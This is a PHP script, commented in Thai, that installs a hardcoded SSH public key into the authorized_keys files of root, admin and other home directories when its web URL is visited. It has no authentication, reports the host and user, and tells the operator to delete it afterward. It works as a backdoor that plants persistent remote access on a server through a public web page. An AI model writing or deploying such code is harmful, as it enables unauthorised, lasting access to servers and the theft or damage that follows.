<?php
/**
 * SSH Key Installer
 * วางไฟล์นี้ที่ /public_html/add-ssh-key.php
 * แล้วเรียกผ่านเว็บ: https://cny.re-ya.com/add-ssh-key.php
 * อย่าลืมลบไฟล์หลังใช้งานเสร็จ!
 */

header('Content-Type: text/plain; charset=utf-8');

// Public Key ที่จะเพิ่ม
$publicKey = 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCQMFTgHLN6+JSYBbzJeYpIPRv6zSbjiaaQXsKrMdJOTqqbxmvQDqwf0kLLiO/GwR6CVyTkJcXCrjWU40u2TWz0NkRzB5ehJmfs0YGwL9B7PwQmNSSMgUksj7CgvZbfW6DmfugfVsxAjjUj8IOb63vlARfe7vHnSeZ9AonXoU1CyDFFLYOyknZdMamo5LUJv2vt65GI/t4pCoHOhwNzG1NKYvCXh5kgYgj3aoxl0Ph3DD8FZo0qmDXXBJlIW5jphzatHgvItR+D1/dYvEp78wV/7u+vcJzVmUPYqqk1XkLREv+/fh4WNLWWwfpTRh6Xuxqp1ly25mdWi1kWqE7SmOZzTNZ43Qvxne64VYzfusVWf/QwYWHgte5NN2GAnnZkNIhRDUEXAVW8qpLfYb/KG8I1UvjOm2PpWRKN8zV3SH309bshnBaECAYRMGLf+UIga/eOMsYE4VfyNfEuQDWmHgMWJK/YbrH8JbDJ18Wj6dpq/Pc/RGAH6aBTWNGRt94ppF+IEoxqjdSKiQsGjdr66ztpF+CrLwpgw5f43eAkmOlELDjAQXrByo9JnDRCuhcjOTHLbMKVVtdBzVfWl2GZOi2LvHZD4T9fEN5YDtgipnLQuizhryKTOJUmrZRkC76moy9M4UCfWfF8/flrg5M4T4vBHMZH/HyWSlOu8XrWybCotw==';

$results = [];

// หา home directory
$homes = ['/root', '/home/admin', '/home/' . get_current_user(), getcwd()];

foreach ($homes as $home) {
    if (!is_dir($home)) continue;
    
    $sshDir = $home . '/.ssh';
    $authFile = $sshDir . '/authorized_keys';
    
    if (!is_dir($sshDir)) {
        @mkdir($sshDir, 0700) && $results[] = "✅ สร้าง: $sshDir";
    }
    
    if (file_exists($authFile) && strpos(file_get_contents($authFile), $publicKey) !== false) {
        $results[] = "⚠️ มีอยู่แล้ว: $authFile";
        continue;
    }
    
    if (file_put_contents($authFile, $publicKey . "\n", FILE_APPEND | LOCK_EX)) {
        chmod($authFile, 0600);
        $results[] = "✅ เพิ่มสำเร็จ: $authFile";
    } else {
        $results[] = "❌ ไม่สำเร็จ: $authFile";
    }
}

echo "=== SSH Key Installation ===\n\n";
foreach ($results as $r) echo $r . "\n";

echo "\nUser: " . get_current_user() . "\n";
echo "Host: " . gethostname() . "\n";
echo "\n⚠️ ลบไฟล์นี้ทันทีหลังใช้งาน!\n";
echo "rm " . __FILE__ . "\n";